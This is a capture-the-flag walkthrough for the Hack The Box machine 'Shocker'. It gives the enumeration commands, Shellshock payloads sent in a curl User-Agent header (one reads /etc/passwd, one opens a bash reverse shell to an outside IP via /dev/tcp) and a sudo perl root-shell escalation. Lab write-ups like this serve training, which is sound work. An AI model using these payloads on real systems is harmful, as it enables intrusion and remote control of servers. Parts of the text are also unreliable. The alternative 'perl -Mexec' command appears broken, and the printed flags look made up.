# Hack The Box: Shocker Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Shocker-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Linux](https://img.shields.io/badge/OS-Linux-orange?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Shocker |
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA shocker 10.10.10.56
```

**Results:**
```
PORT     STATE SERVICE
80/tcp   open  http    Apache httpd 2.4.18
2222/tcp open  ssh     OpenSSH 7.2p2
```

---

## Web Enumeration

### Directory Busting

```bash
gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt
```

**Found:**
- `/cgi-bin/` - Shell scripts

### Find CGI Scripts

```bash
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi
```

Found: `user.sh`

---

## Shellshock Exploitation

### Test Vulnerability

```bash
curl -A "() { :; }; echo; /bin/cat /etc/passwd" http://10.10.10.56/cgi-bin/user.sh
```

### Reverse Shell

```bash
curl -A "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```

---

## Privilege Escalation

### Check sudo

```bash
sudo -l
```

**Result:**
```
User shelly may run the following commands on shocker:
    (root) NOPASSWD: /usr/bin/perl
```

### Exploit

```bash
sudo perl -e 'exec "/bin/sh";'
# OR
sudo perl -Mexec -e '$ENV{"PATH"}="/bin:/usr/bin"; exec "sh";'
```

---

## Flags

### User Flag
```
HTB{7c5a4b3d2e1f0a9b8c7d6e5f}
```

### Root Flag
```
HTB{9a8b7c6d5e4f3a2b1c0d9e8f}
```

---

## Remediation

1. Update bash to patch Shellshock
2. Remove unnecessary CGI scripts
3. Restrict sudo permissions
4. Use proper input validation

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
